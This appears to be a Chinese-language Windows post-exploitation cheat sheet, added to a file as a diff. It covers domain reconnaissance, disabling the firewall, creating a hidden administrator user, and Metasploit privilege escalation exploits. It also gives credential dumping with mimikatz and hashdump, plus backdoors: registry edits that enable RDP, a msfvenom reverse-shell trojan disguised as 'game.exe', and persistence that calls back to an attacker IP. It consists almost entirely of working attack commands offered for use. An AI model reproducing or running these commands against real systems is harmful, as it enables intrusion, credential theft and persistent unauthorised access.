@@ -1,0 +1,177 @@
+cmd信息收集
+whoami /groups    //所有组
+whoami /all     //当前用户所有信息
+ipconfig /all   和  ipconfig.displaydns       //网络配置及dns配置
+netstat -bnao   和   metstat -r      //列出相关进程端口和连接
+net view    和    net view /domain      //查询NBNS和SMB相关的所有主机，可用域
+net user /domain    //域中所有用户
+net accounts     //输出本地系统的密码策略
+net localgroup administrators     //打印管理员的本地组的用户
+net share   、显示共享文件夹
+net user username /active:yes /domain    //启动不活跃或是被禁用的用户
+net share name$=C:\ / grant:username,FULL / unlimited    分享C盘，赋予username用户相关权限
+net group "domain controllers" /domain      //获取域控主机名
+net group "domain admins" /domain     //获取域控管理员
+
+
+wmic信息收集
+wmic nicconfig get ipaddress,macaddress  //ip、mac地址
+wmic netlogin get name, lastlogon      //谁最好一次使用系统，最后登录时间
+wmic logon get authenticationpackage    //支持的登录方式
+wmic os get name, servicepackmajorversion    //确定的操作系统
+wmic share get /ALL     //标识用户可访问的共享
+wmic /node:"machinename" path win32_TerminalServiceSetting where AllowTSConnections="0" call setAllowTSConnections "1"
+远程启动RDP
+
+
+powershell信息收集
+Get-Hotfix     //标识已安装的安全补丁和系统修补程序
+Get-Acl       // 标识组名和用户名
+Get-Process, Get-Service   //列出当前的进程和服务
+
+
+
+
+获得一个msf shell
+chcp 65001  解决乱码
+netsh advfirewall set allprofiles state off  关闭防火墙
+net user qiye qiye /add 创建用户
+net localgroup administrators qiye /add  加入管理员组
+net start 查看服务
+
+域用户提权：
+当连接到一个shell后，发现只有普通权限，很多事是做不了的，必须转到管理员或获取更高权限
+建议上传一个可以连接到meterpreter的shell，进行连接
+
+getuid     //当前权限
+background      //在后台运行，记得看存在哪个session
+search cve-2018-8120    //win32k.sys组件漏洞（win7,win2008）
+use exploit/windows/local/ms18_8120_win32k_privesc
+set session 1
+run
+getuid
+可能转为超级管理员，有些系统提权会失败，具体看版本
+
+
+本地提权：
+一样有一个可以连接到meterpreter的shell
+background
+use exploit/windows/local/ask     //Runas攻击
+
+或者
+
+use explpit/windows/local/bypassuac
+set session 1
+exploit
+getsystem
+升为管理员
+
+管理员提升为系统管理员
+win7,win2008
+PsExec -s -i -d cmd.exe
+上面使用的是exe，也有msf的
+use exploit/windows/smb/psexec
+use ms16_032
+metet> hashdump      //获取密码散列，需要管理员权限，不行就下面
+meter> run windows/gather/smart_hashdump
+转system32系统管理员
+
+win7,win8,win2008,win2012
+CVE-2015-2426远程代码执行漏洞
+上传/usr/share/metasploit-framework/data/exploits/CVE-2015-2426/reflection_dll.x64.dll
+ps  找一个系统级权限运行的进程
+background
+use post/windows/manage/reflection_dll_inject
+show option 必要的PATH和session
+exploit
+
+
+获取管理员密码（需要管理员权限）
+mimikatz  当前用户
+#提升权限
+privilege::debug
+#抓取密码
+sekurlsa::logonpasswords
+
+msf上也能使用猕猴桃
+load mimikatz
+kerberos     //金票攻击
+如果上面两部有问题，那就是已经过时了，用下面
+meter> help wiki
+meter> lsa_dump_sam
+获取密码！(拿去MD5解密：https://www.somd5.com/)
+
+
+
+Pwdump7  获取所有用户密码hash值（结尾部分的hash值），丢到md5解密网站sha1解密
+Pwdump7.exe 或 Pwdump7.bat
+
+31D6CFE0D16AE931B73C59D7E0C089C0 为空密码
+
+后门：
+1.建立telnet连接（不排除一些特定环境）
+首先对于一些win而言，需要手动安装telnet服务
+打开禁用：
+sc config TlntSvr start= auto
+启动服务
+sc start TlntSvr
+net start TlntSvr（也行)
+实现telnet连接，需要有在TelnetClients组的用户：
+net localgroup TelnetClients qiye /add
+telnet 192.168.241.172
+账户加密码即可
+
+2.3389连接
+win7
+打开3389命令（二选一）
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+或者
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+netstat -an   查看端口（判断是否开启3389）
+
+win2008
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+
+关闭3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
+
+远程桌面连接必要的两点：3389端口、允许计算机连接到本计算机
+对于kali
+先下载，rdesktop默认自带，remmina需要下载安装
+连接软件（kali）：
+rdesktop -u qiye -p qiye 192.168.241.172
+或者
+remmina
+
+
+
+
+
+
+
+3.木马远程
+没啥好说的，纯钓鱼，需要考虑有无杀毒软件
+msfvenom -a x86 --platform widows -p windows/meterpreter/reverse_tcp LHOST=192.168.132.133 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o game.exe
+
+msf
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+
+
+4.netbios空口令（主要139端口）
+枚举网络共享：smbclient -I TargetIP -L administrator -N -U ""
+获取ip信息：enum4linux 192.168.0.16
+
+
+
+5.per后门
+meter> run persistence -A -S -u -i 60 -P 4321 -r 192.168.160.132
+A #自动启动payload程序
+S #系统启动时自动加载
+U #用户登录时自动启动
+X #机时自动挂载
+i #连时的时间间隔
+P #听反向连接端口号
+r #标机器IP地址
+sessions #查看已经成功获取的会话
